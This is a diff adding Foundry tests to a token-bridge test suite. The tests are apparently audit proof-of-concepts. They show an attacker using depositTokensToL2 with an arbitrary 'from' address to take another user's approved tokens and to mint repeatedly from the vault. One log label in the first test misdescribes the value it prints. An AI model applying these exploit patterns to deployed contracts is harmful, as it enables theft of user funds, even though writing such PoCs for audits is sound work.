@@ -223,4 +223,41 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    function testCanMoveApprovedTokensToOthers() public{
+        // alice 
+        //  uint256 amount = 10e18;
+        vm.startPrank(user);
+        token.approve(address(tokenBridge),type(uint256).max);
+        
+        //bob
+        uint256 depositAmount=token.balanceOf(address(user));
+        address attacker=makeAddr('attacker');
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user,attacker,depositAmount);
+        tokenBridge.depositTokensToL2(user,attacker,depositAmount);
+        console2.log("Attacker balance : ", token.balanceOf(address(vault)));
+        assertEq(token.balanceOf(user),0);
+        assertEq(token.balanceOf(address(vault)),depositAmount);
+        vm.stopPrank();
+        console2.log("User balance : ", token.balanceOf(address(user)));
+    }
+
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        uint256 depositAmount = 500 ether;
+        uint256 totalAmount = depositAmount * 3;
+        deal(address(token), address(vault), totalAmount);
+        vm.prank(address(vault));
+        token.approve(address(tokenBridge), type(uint256).max);
+        vm.startPrank(attacker);
+        for (uint256 i = 0; i < 3; i++) {
+            vm.expectEmit(true, true, false, true);
+            emit Deposit(address(vault), attacker, depositAmount);
+            tokenBridge.depositTokensToL2(address(vault), attacker, depositAmount);
+        }
+        vm.stopPrank();
+
+    }
 }
